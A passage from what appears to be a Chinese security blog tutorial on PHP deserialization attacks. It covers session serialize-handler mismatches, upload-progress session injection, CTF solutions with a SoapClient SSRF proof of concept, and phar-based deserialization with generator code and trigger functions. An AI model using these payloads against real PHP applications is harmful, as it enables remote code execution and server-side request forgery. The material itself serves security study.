<p>&#x5229;&#x7528;&#x539F;&#x7406;&#xFF1A; php &#x5728;&#x83B7;&#x53D6; session &#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x6309;&#x7167;<code>session.serialize_handler=php</code> &#x89C4;&#x5219;&#x6765;&#x5904;&#x7406; session &#x6587;&#x4EF6;&#x3002;&#x628A; <code>|</code> &#x524D;&#x9762;&#x7684;&#x503C;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;session&#x952E;&#x540D;&#xFF0C;&#x5BF9; <code>|</code> &#x540E;&#x9762;&#x5C31;&#x4F1A;&#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;</p>
<h4 id="trick-2"><a href="#trick-2" class="headerlink" title="trick-2"></a>trick-2</h4><p>&#x914D;&#x7F6E;&#x4E0D;&#x5F53;&#x53EF;&#x9020;&#x6210;session&#x88AB;&#x63A7;&#x3002;</p>
<p>&#x5F53;<code>session.upload_progress.enabled</code>&#x6253;&#x5F00;&#x65F6;&#xFF0C;php&#x4F1A;&#x8BB0;&#x5F55;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7684;&#x8FDB;&#x5EA6;&#xFF0C;&#x5728;&#x4E0A;&#x4F20;&#x65F6;&#x4F1A;&#x5C06;&#x5176;&#x4FE1;&#x606F;&#x4FDD;&#x5B58;&#x5728;<code>$_SESSION</code>&#x4E2D;&#x3002;</p>
<p>&#x4F46;&#x5F53;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x65F6;&#xFF0C;&#x540C;&#x65F6;POST&#x4E00;&#x4E2A;&#x4E0E;php.ini&#x4E2D;<code>session.upload_progress.name</code>&#x540C;&#x540D;&#x7684;&#x53D8;&#x91CF;&#x65F6;(<code>session.upload_progress.name</code>&#x7684;&#x53D8;&#x91CF;&#x503C;&#x9ED8;&#x8BA4;&#x4E3A;<code>PHP_SESSION_UPLOAD_PROGRESS</code>&#xFF09;&#xFF0C;PHP&#x68C0;&#x6D4B;&#x5230;&#x8FD9;&#x79CD;&#x540C;&#x540D;&#x8BF7;&#x6C42;&#x4F1A;&#x5728;<code>$_SESSION</code>&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x6761;&#x6570;&#x636E;&#x3002;&#x6211;&#x4EEC;&#x7531;&#x6B64;&#x6765;&#x8BBE;&#x7F6E;session&#x3002;</p>
<p><code>session.upload_progress.cleanup</code>&#x5173;&#x95ED;&#x3002;&#x8FD9;&#x5C31; &#x6781;&#x5927;&#x63D0;&#x9AD8;&#x4E86;&#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;&#x6210;&#x529F;&#x7387;&#x3002;&#x5982;&#x679C;&#x6B64;&#x9009;&#x9879;<code>session.upload_progress.cleanup</code>&#x6253;&#x5F00;&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x5229;&#x7528;&#x65F6;&#x653B;&#x51FB;&#x8005;&#x9700;&#x8981;&#x4E0A;&#x4F20;large and crash&#x6587;&#x4EF6;&#xFF0C;&#x6765;&#x4F7F;&#x5F97;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;data&#x5F97;&#x4EE5;&#x6267;&#x884C;&#x3002;</p>
<p>&#x8BE6;&#x60C5;&#x89C1;<a href="https://bugs.php.net/bug.php?id=71101" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=71101</a></p>
<h3 id="&#x4F8B;&#x5B50;&#x4E00;-1"><a href="#&#x4F8B;&#x5B50;&#x4E00;-1" class="headerlink" title="&#x4F8B;&#x5B50;&#x4E00;"></a>&#x4F8B;&#x5B50;&#x4E00;</h3><p>&#x9898;&#x76EE;&#x94FE;&#x63A5;: <a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a> </p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="hljs-string">&apos;session.serialize_handler&apos;</span>, <span class="hljs-string">&apos;php&apos;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $mdzz;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&apos;phpinfo();&apos;</span>;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&apos;phpinfo&apos;</span>]))</span><br><span class="line">{</span><br><span class="line">    $m = <span class="hljs-keyword">new</span> OowoO();</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">else</span></span><br><span class="line">{</span><br><span class="line">    highlight_string(file_get_contents(<span class="hljs-string">&apos;index.php&apos;</span>));</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5DEE;&#x5F02;&#x70B9;:</p>
<ol>
<li>phpinfo&#x4E2D; <code>session.serialize_handler = php_serialize</code>&#x3002;</li>
<li>&#x9898;&#x76EE;&#x4E2D; <code>ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</code></li>
</ol>
<p>&#x6838;&#x5FC3;&#x76EE;&#x7684;: &#x8FDB;&#x5165; <code>eval</code> &#x51FD;&#x6570;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x3002;&#x7531;&#x4E8E;&#x9898;&#x76EE;&#x4E2D;&#x5E76;&#x6CA1;&#x6709;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#xFF0C;&#x5176;&#x4E2D; <code>$this-&gt;mdzz</code> &#x4E0D;&#x53EF;&#x901A;&#x8FC7;&#x5E38;&#x89C4;&#x624B;&#x6BB5;&#x63A7;&#x5236;&#x3002;</p>
<p>&#x89C2;&#x5BDF;phpinfo&#x4E2D;session&#x5176;&#x4ED6;&#x6709;&#x5173;&#x4FE1;&#x606F;<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201620913.png" alt="image-20201113201620913"></p>
<p>&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x4E0A;&#x4F20;&#x7684;&#x9875;&#x9762;<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">&lt;form action=<span class="hljs-string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="hljs-string">&quot;change&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6784;&#x9020;poc</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">{</span><br><span class="line">    public $mdzz;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$a = new OowoO();</span><br><span class="line">$a-&gt;mdzz = &quot;payload&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x626B;&#x63CF;&#x76EE;&#x5F55;<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201629436.png" alt="image-20201113201629436"></p>
<p>phpinfo&#x4E2D;&#x7684;<code>_SERVER[&quot;SCRIPT_FILENAME&quot;]</code>&#x5B57;&#x6BB5;&#x5F97;&#x5230;&#x8DEF;&#x5F84;&#xFF1A;<code>/opt/lampp/htdocs/</code>&#x3002;</p>
<p>&#x968F;&#x540E;&#x7528;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201637025.png" alt="image-20201113201637025"></p>
<h3 id="&#x4F8B;&#x5B50;&#x4E8C;-1"><a href="#&#x4F8B;&#x5B50;&#x4E8C;-1" class="headerlink" title="&#x4F8B;&#x5B50;&#x4E8C;"></a>&#x4F8B;&#x5B50;&#x4E8C;</h3><p>&#x9898;&#x76EE;&#x6765;&#x6E90;: LCTF2018-bestphp&#x2019;s revenge </p>
<p>&#x9898;&#x76EE;&#x7ED9;&#x4E86;&#x4E24;&#x4E2A;&#x6E90;&#x7801;</p>
<p>index.php</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="hljs-string">&apos;implode&apos;</span>;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[name])){</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">}</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="hljs-keyword">array</span>(reset($_SESSION),<span class="hljs-string">&apos;welcome_to_the_lctf2018&apos;</span>);</span><br><span class="line">call_user_func($b,$a);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>flag.php</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;only localhost can get flag!&apos;</span>;</span><br><span class="line">$flag = <span class="hljs-string">&apos;LCTF{*************************}&apos;</span>;</span><br><span class="line"><span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>){</span><br><span class="line">       $_SESSION[<span class="hljs-string">&apos;flag&apos;</span>] = $flag;</span><br><span class="line">   }</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>flag.php &#x8DDF; index.php &#x4E4B;&#x95F4;&#x7684;&#x5FAE;&#x5999;&#x8054;&#x7CFB;&#x4F53;&#x73B0;&#x5728;<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">$_SESSION[<span class="hljs-string">&apos;flag&apos;</span>] = $flag;</span><br><span class="line">var_dump($_SESSION);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><code>$_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;</code>&#x3002;&#x8FD9;&#x91CC;&#x81EA;&#x7136;&#x60F3;&#x5230;SSRF&#x3002;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4E0A;&#x6587;&#x63D0;&#x5230;&#x7684;php&#x539F;&#x751F;&#x7C7B;SoapClient&#x4E2D;&#x7684;<code>__call</code>&#x65B9;&#x6CD5;&#x8FDB;&#x884C;SSRF&#x3002;</p>
<p>&#x6784;&#x9020;SSRF&#x7684;POC (POC&#x6765;&#x81EA; @Smi1e)</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$url = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">$b = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;uri&apos;</span> =&gt; $url, <span class="hljs-string">&apos;location&apos;</span> =&gt; $url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="hljs-string">&apos;^^&apos;</span>, <span class="hljs-string">&quot;\r\n&quot;</span>, $a);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;|&quot;</span> . urlencode($a);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>index.php &#x4E2D;&#x6D89;&#x53CA;&#x5230;&#x4E86;<code>call_user_func</code> &#x51FD;&#x6570;&#x3002;PHP&#x624B;&#x518C;&#x4E2D; &#x7ED9;&#x4E86;&#x51E0;&#x4E2A;<code>call_user_func</code> &#x51FD;&#x6570;&#x7684;&#x4F8B;&#x5B50;: <a href="https://www.php.net/manual/zh/function.call-user-func.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.call-user-func.php</a><br>&#x5176;&#x4E2D;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x5F53;&#x6211;&#x4EEC;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4E3A;&#x6570;&#x7EC4;&#x65F6;&#xFF0C;&#x4F1A;&#x628A;&#x7B2C;&#x4E00;&#x4E2A;&#x503C;&#x5F53;&#x4F5C;&#x7C7B;&#x540D;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x503C;&#x5F53;&#x4F5C;&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x56DE;&#x8C03;<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201649416.png" alt="image-20201113201649416"></p>
<p>&#x4E3A;&#x4E86;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x53EA;&#x80FD;&#x5229;&#x7528;PHP&#x4E2D;SESSION&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x673A;&#x5236;&#x3002;&#x4E3B;&#x8981;&#x4F53;&#x73B0;&#x5728;&#x5DEE;&#x5F02;&#x6027;(&#x5F53;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5F15;&#x64CE;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5F15;&#x64CE;&#x4E0D;&#x4E00;&#x81F4;&#x65F6;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5F15;&#x64CE;&#x4E4B;&#x95F4;&#x7684;&#x5DEE;&#x5F02;&#x4EA7;&#x751F;&#x5E8F;&#x5217;&#x5316;&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;)&#x3002;&#x4F46;&#x662F;&#x5728;PHP&#x4E2D;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&#x7684;&#x662F;PHP&#x5F15;&#x64CE;&#x3002;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x4E3A;&#x4E86;&#x5C55;&#x73B0;session&#x7684;&#x5DEE;&#x5F02;&#x6027;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x4EE3;&#x7801;&#x624B;&#x52A8;&#x6784;&#x9020;&#x5DEE;&#x5F02;&#x6027;&#x3002;</p>
<p>&#x901A;&#x8FC7; <code>call_user_func($_GET[&apos;f&apos;], $_POST);</code> &#x6784;&#x9020;PHP&#x5F15;&#x64CE;&#x5DEE;&#x5F02;&#x6027;&#x3002;&#x5E76;&#x901A;&#x8FC7; <code>$_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];</code> &#x5C06;&#x6784;&#x9020;&#x7684;Soap&#x7C7B;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x5199;&#x5165;session&#x6587;&#x4EF6;<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201704046.png" alt="image-20201113201704046"></p>
<p>&#x4E3A;&#x4E86;&#x8C03;&#x7528; <code>__call</code> &#x65B9;&#x6CD5;&#x3002;&#x9996;&#x5148;&#x5229;&#x7528;<code>call_user_func($_GET[&apos;f&apos;], $_POST);</code>&#x4F20;&#x5165; <code>f=extract</code> &#x8FDB;&#x884C;POST&#x53D8;&#x91CF;&#x8986;&#x76D6;&#x3002;&#x968F;&#x540E;&#x901A;&#x8FC7;GET&#x4F20;&#x53C2;&#x4EE4;<code>$_SESSION[&apos;name&apos;] = SoapClient</code>&#x3002;&#x518D;&#x5229;&#x7528;POST&#x4F20;&#x53C2;&#x8FDB;&#x884C;&#x53D8;&#x91CF;b&#x7684;&#x8986;&#x76D6;&#x3002;&#x5373;&#x8C03;&#x7528; SoapClient &#x7C7B;&#x4E0D;&#x5B58;&#x5728;&#x7684; <code>welcome_to_the_lctf2018</code> &#x65B9;&#x6CD5;&#xFF0C;&#x4ECE;&#x800C;&#x89E6;&#x53D1; <code>__call</code> &#x65B9;&#x6CD5;&#x53D1;&#x8D77; soap &#x8BF7;&#x6C42;&#x8FDB;&#x884C; SSRF &#x3002;<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201738749.png" alt="image-20201113201738749"></p>
<p>&#x6700;&#x540E;&#x643A;&#x5E26;cookie&#x8BBF;&#x95EE;</p>
<h2 id="Phar&#x62D3;&#x5C55;&#x653B;&#x51FB;&#x9762;"><a href="#Phar&#x62D3;&#x5C55;&#x653B;&#x51FB;&#x9762;" class="headerlink" title="Phar&#x62D3;&#x5C55;&#x653B;&#x51FB;&#x9762;"></a>Phar&#x62D3;&#x5C55;&#x653B;&#x51FB;&#x9762;</h2><h3 id="Phar&#x7B80;&#x4ECB;"><a href="#Phar&#x7B80;&#x4ECB;" class="headerlink" title="Phar&#x7B80;&#x4ECB;"></a>Phar&#x7B80;&#x4ECB;</h3><p>&#x62D3;&#x5C55;&#x653B;&#x51FB;&#x9762;&#x4F53;&#x73B0;&#x5728;: &#x53EF;&#x901A;&#x8FC7;&#x6784;&#x9020; phar &#x5728;&#x6CA1;&#x6709; <code>unserailize()</code> &#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5B9E;&#x73B0;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x653B;&#x51FB;</p>
<p><a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">&#x7531; PHPGGC &#x7406;&#x89E3; PHP &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;</a> &#x4E00;&#x6587;&#x4E2D;&#x5BF9;&#x5176;&#x6982;&#x5FF5;&#x6982;&#x62EC;&#x5341;&#x5206;&#x7B80;&#x6D01;&#x660E;&#x4E86;</p>
<blockquote>
<p>&#x7B80;&#x5355;&#x6765;&#x8BF4;phar&#x5C31;&#x662F;php&#x538B;&#x7F29;&#x6587;&#x6863;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x628A;&#x591A;&#x4E2A;&#x6587;&#x4EF6;&#x5F52;&#x6863;&#x5230;&#x540C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x800C;&#x4E14;&#x4E0D;&#x7ECF;&#x8FC7;&#x89E3;&#x538B;&#x5C31;&#x80FD;&#x88AB; php &#x8BBF;&#x95EE;&#x5E76;&#x6267;&#x884C;&#xFF0C;&#x4E0E;<code>file://</code> &#xFF0C;<code>php://</code>&#x7B49;&#x7C7B;&#x4F3C;&#xFF0C;&#x4E5F;&#x662F;&#x4E00;&#x79CD;&#x6D41;&#x5305;&#x88C5;&#x5668;&#x3002;</p>
</blockquote>
<blockquote>
<p>phar&#x7ED3;&#x6784;&#x7531; 4 &#x90E8;&#x5206;&#x7EC4;&#x6210;</p>
<ol>
<li><code>stub</code> phar &#x6587;&#x4EF6;&#x6807;&#x8BC6;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A; <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;&#xFF1B;</code></li>
<li><code>manifest</code> &#x538B;&#x7F29;&#x6587;&#x4EF6;&#x7684;&#x5C5E;&#x6027;&#x7B49;&#x4FE1;&#x606F;&#xFF0C;&#x4EE5;&#x5E8F;&#x5217;&#x5316;&#x5B58;&#x50A8;&#xFF1B;</li>
<li><code>contents</code> &#x538B;&#x7F29;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#xFF1B;</li>
<li><code>signature</code> &#x7B7E;&#x540D;&#xFF0C;&#x653E;&#x5728;&#x6587;&#x4EF6;&#x672B;&#x5C3E;&#xFF1B;</li>
</ol>
</blockquote>
<blockquote>
<p>&#x8FD9;&#x91CC;&#x6709;&#x4E24;&#x4E2A;&#x5173;&#x952E;&#x70B9;&#xFF0C;&#x4E00;&#x662F;&#x6587;&#x4EF6;&#x6807;&#x8BC6;&#xFF0C;&#x5FC5;&#x987B;&#x4EE5;<code>__HALT_COMPILER();?&gt;</code>&#x7ED3;&#x5C3E;&#xFF0C;&#x4F46;&#x524D;&#x9762;&#x7684;&#x5185;&#x5BB9;&#x6CA1;&#x6709;&#x9650;&#x5236;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8F7B;&#x6613;&#x4F2A;&#x9020;&#x4E00;&#x4E2A;&#x56FE;&#x7247;&#x6587;&#x4EF6;&#x6216;&#x8005;pdf&#x6587;&#x4EF6;&#x6765;&#x7ED5;&#x8FC7;&#x4E00;&#x4E9B;&#x4E0A;&#x4F20;&#x9650;&#x5236;&#xFF1B;&#x4E8C;&#x662F;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;phar&#x5B58;&#x50A8;&#x7684;meta-data&#x4FE1;&#x606F;&#x4EE5;&#x5E8F;&#x5217;&#x5316;&#x65B9;&#x5F0F;&#x5B58;&#x50A8;&#xFF0C;&#x5F53;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x51FD;&#x6570;&#x901A;&#x8FC7;<code>phar://</code>&#x4F2A;&#x534F;&#x8BAE;&#x89E3;&#x6790;phar&#x6587;&#x4EF6;&#x65F6;&#x5C31;&#x4F1A;&#x5C06;&#x6570;&#x636E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x800C;&#x8FD9;&#x6837;&#x7684;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x51FD;&#x6570;&#x6709;&#x5F88;&#x591A;&#x3002;</p>
</blockquote>
<p>&#x5229;&#x7528;&#x6761;&#x4EF6;:</p>
<ol>
<li>phar&#x6587;&#x4EF6;&#x8981;&#x80FD;&#x591F;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x3002;</li>
<li>&#x8981;&#x6709;&#x53EF;&#x7528;&#x7684;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4F5C;&#x4E3A;&#x201C;&#x8DF3;&#x677F;&#x201D;&#x3002;</li>
<li>&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x53EF;&#x63A7;&#xFF0C;&#x4E14;<code>:</code>&#x3001;<code>/</code>&#x3001;<code>phar</code>&#x7B49;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x6CA1;&#x6709;&#x88AB;&#x8FC7;&#x6EE4;&#x3002;</li>
</ol>
<p>&#x751F;&#x6210;Phar<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>{</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="hljs-string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x4E3A;phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//&#x8BBE;&#x7F6E;stub</span></span><br><span class="line">    $o = <span class="hljs-keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="hljs-comment">//&#x5C06;&#x81EA;&#x5B9A;&#x4E49;&#x7684;meta-data&#x5B58;&#x5165;manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//&#x6DFB;&#x52A0;&#x8981;&#x538B;&#x7F29;&#x7684;&#x6587;&#x4EF6;</span></span><br><span class="line">    <span class="hljs-comment">//&#x7B7E;&#x540D;&#x81EA;&#x52A8;&#x8BA1;&#x7B97;</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<blockquote>
<p>PS: &#x8981;&#x5C06;php.ini&#x4E2D;&#x7684;<code>phar.readonly</code>&#x9009;&#x9879;&#x8BBE;&#x7F6E;&#x4E3A;Off&#xFF0C;&#x5426;&#x5219;&#x65E0;&#x6CD5;&#x751F;&#x6210;phar&#x6587;&#x4EF6;</p>
</blockquote>
<h3 id="&#x89E6;&#x53D1;&#x6761;&#x4EF6;"><a href="#&#x89E6;&#x53D1;&#x6761;&#x4EF6;" class="headerlink" title="&#x89E6;&#x53D1;&#x6761;&#x4EF6;"></a>&#x89E6;&#x53D1;&#x6761;&#x4EF6;</h3><p>@secii &#x5E08;&#x5085;&#x6587;&#x4E2D;&#x63D0;&#x5230;: php&#x4E00;&#x5927;&#x90E8;&#x5206;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x51FD;&#x6570;&#x5728;&#x901A;&#x8FC7;<code>phar://</code>&#x4F2A;&#x534F;&#x8BAE;&#x89E3;&#x6790;phar&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x90FD;&#x4F1A;&#x5C06;meta-data&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;</p>
<ul>
<li><code>fileatime</code> / <code>filectime</code> / <code>filemtime</code></li>
<li><code>stat</code> / <code>fileinode</code> / <code>fileowner</code> / <code>filegroup</code> / <code>fileperms</code></li>
<li><code>file</code> / <code>file_get_contents</code> / <code>readfile</code> / <code>fopen</code></li>
<li><code>file_exists</code> / <code>is_dir</code> / <code>is_executable</code> / <code>is_file</code> / <code>is_link</code> / <code>is_readable</code> / <code>is_writeable</code> / <code>is_writable</code></li>
<li><code>parse_ini_file</code></li>
<li><code>unlink</code></li>
<li><code>copy</code></li>
</ul>
<p>&#x968F;&#x540E; @zsx &#x5E08;&#x5085;blog&#x4E2D; <a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">Phar&#x4E0E;Stream Wrapper&#x9020;&#x6210;PHP RCE&#x7684;&#x6DF1;&#x5165;&#x6316;&#x6398;</a> &#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x4E86;&#x66F4;&#x6DF1;&#x5165;&#x7684;&#x6316;&#x6398;</p>
<ul>
<li>exif<ul>
<li><code>exif_thumbnail</code></li>
<li><code>exif_imagetype</code></li>
</ul>
</li>
</ul>
<ul>
<li>gd<ul>
<li><code>imageloadfont</code></li>
<li><code>imagecreatefrom***</code></li>
</ul>
</li>
</ul>
<ul>
<li>hash<ul>
<li><code>hash_hmac_file</code></li>
<li><code>hash_file</code></li>
<li><code>hash_update_file</code></li>
<li><code>md5_file</code></li>
<li><code>sha1_file</code></li>
</ul>
</li>
</ul>
<ul>
<li>file / url<ul>
<li><code>get_meta_tags</code></li>
<li><code>get_headers</code></li>
</ul>
</li>
</ul>
<ul>
<li>standard<ul>
<li><code>getimagesize</code></li>
<li><code>getimagesizefromstring</code></li>
</ul>
</li>
</ul>
<ul>
<li><p>zip<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">$zip = <span class="hljs-keyword">new</span> ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(<span class="hljs-string">&apos;c.zip&apos;</span>);</span><br><span class="line">$zip-&gt;extractTo(<span class="hljs-string">&apos;phar://test.phar/test&apos;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
